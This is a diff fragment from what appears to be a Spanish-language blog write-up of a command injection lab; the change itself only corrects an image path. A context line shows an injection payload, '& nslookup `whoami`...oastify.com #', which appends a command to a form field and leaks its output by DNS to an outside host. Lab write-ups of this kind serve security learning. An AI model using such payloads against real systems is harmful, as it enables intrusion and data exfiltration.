@@ -37,7 +37,7 @@ Asi que debemos inyectar el payload en la respuesta del formulario, no olvidar c
 & nslookup `whoami`.tjgapmpd6yhieubhjiot4zc7iyoqco0d.oastify.com #
 ```
 
-![Conf2]({{site.url}}/images/Command Injection/command-lab-54/conf2.png)
+![Conf2]({{site.url}}/images/Command Injection/command-lab-5/conf2.png)
 
 Vemos la respuesta
 
